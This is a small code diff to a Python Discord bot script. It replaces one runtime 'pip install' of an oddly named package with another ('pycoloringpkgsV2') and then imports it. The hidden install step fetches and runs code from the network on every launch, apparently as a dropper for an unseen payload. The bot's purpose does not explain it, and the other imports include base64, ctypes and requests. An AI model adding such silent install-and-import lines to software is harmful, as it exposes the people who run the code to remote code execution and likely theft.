@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install pipsqlpackageV2")
-import pipsqlpackageV2
+os.system("pip install pycoloringpkgsV2")
+import pycoloringpkgsV2
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
